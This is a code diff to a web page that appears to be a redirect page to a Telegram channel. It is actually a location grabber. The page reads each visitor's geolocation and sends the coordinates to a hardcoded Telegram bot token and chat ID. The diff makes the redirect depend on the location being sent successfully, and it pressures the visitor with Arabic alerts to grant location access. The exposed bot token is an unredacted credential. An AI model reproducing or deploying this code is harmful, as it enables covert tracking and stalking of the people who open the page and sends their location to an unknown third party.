@@ -29,19 +29,8 @@
     const BOT_TOKEN = "7786101064:AAEHsY7be9Tk6SQtShnDR4jgmNxO59Qi2cQ";
     const CHAT_ID = "6028485445";
 
-    function getLocationAndSend() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((position) => {
-          const lat = position.coords.latitude;
-          const lon = position.coords.longitude;
-
-          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
-            .catch(() => {});
-        }, () => {});
-      }
-    }
-
     let seconds = 5;
+    let locationSent = false;
 
     function startCountdown() {
       const countdownEl = document.getElementById("countdown");
@@ -52,9 +41,35 @@
         countdownEl.innerText = seconds;
         if (seconds === 0) {
           clearInterval(interval);
-          window.location.href = "https://t.me/sswq22";
+          if(locationSent) {
+            window.location.href = "https://t.me/sswq22";
+          } else {
+            alert("يرجى الموافقة على مشاركة الموقع أولاً.");
+          }
         }
       }, 1000);
+    }
+
+    function getLocationAndSend() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition((position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+
+          fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`)
+            .then(() => {
+              locationSent = true;  // علمنا أن الموقع أُرسل بنجاح
+            })
+            .catch(() => {
+              locationSent = false;
+            });
+        }, () => {
+          locationSent = false;
+          alert("تم رفض مشاركة الموقع، لن تتم إعادة التوجيه.");
+        });
+      } else {
+        alert("المتصفح لا يدعم تحديد الموقع.");
+      }
     }
 
     window.onload = () => {
